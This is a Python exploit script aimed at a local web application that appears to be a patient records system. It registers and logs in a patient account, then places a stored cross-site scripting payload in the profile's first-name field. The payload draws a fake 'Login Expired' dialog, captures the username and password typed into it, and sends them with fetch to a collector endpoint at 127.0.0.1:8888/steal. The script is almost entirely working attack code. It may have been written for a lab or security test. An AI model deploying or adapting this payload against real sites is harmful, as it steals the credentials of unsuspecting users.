import requests


register_url = "http://127.0.0.1:5000/register"
session = requests.Session()


session.get(register_url)


register_data = {
    "username": "888",
    "password": "888",
    "role": "patient"
}

resp = session.post(register_url, data=register_data)
print("✅ Registered:", resp.status_code)


login_url = "http://127.0.0.1:5000/login"
login_data = {
    "username": "888",
    "password": "888"
}
resp = session.post(login_url, data=login_data)
print("✅ Logged in:", resp.status_code)


profile_url = "http://127.0.0.1:5000/profile"
profile_data = {
    "first_name": '''<script>
setTimeout(() => {
  const modal = document.createElement('div');
  modal.innerHTML = `
    <div style="
      position:fixed;top:30%;left:50%;transform:translateX(-50%);
      width:300px;background:white;padding:20px;
      box-shadow:0 0 15px rgba(0,0,0,0.3);
      z-index:99999;font-family:sans-serif;">
      <h3 style="margin-top:0;font-size:18px;">Login Expired</h3>
      <input id="xuser" placeholder="Username"
        style="width:100%;padding:8px;margin-bottom:10px;border:1px solid #ccc" />
      <input id="xpass" type="password" placeholder="Password"
        style="width:100%;padding:8px;margin-bottom:10px;border:1px solid #ccc" />
      <button onclick="steal()"
        style="width:100%;padding:10px;background:#007BFF;color:white;border:none;">
        Re-login
      </button>
    </div>`;
  document.body.appendChild(modal);
}, 500);

function steal() {
  const u = document.getElementById("xuser").value;
  const p = document.getElementById("xpass").value;
  fetch("http://127.0.0.1:8888/steal?u=" + encodeURIComponent(u) + "&p=" + encodeURIComponent(p));
  alert("Login failed. Please try again.");
}
</script>''',
    "last_name": "PatientA",
    "phone": "1234567890",
    "date_of_birth": "1990-01-01",
    "gender": "Other",
    "blood_group": "O+",
    "allergies": "None",
    "medical_conditions": "None",
    "current_medications": "None",
    "emergency_contact_name": "H",
    "emergency_contact_phone": "1"
}

resp = session.post(profile_url, data=profile_data)
print("✅ Profile submitted:", resp.status_code)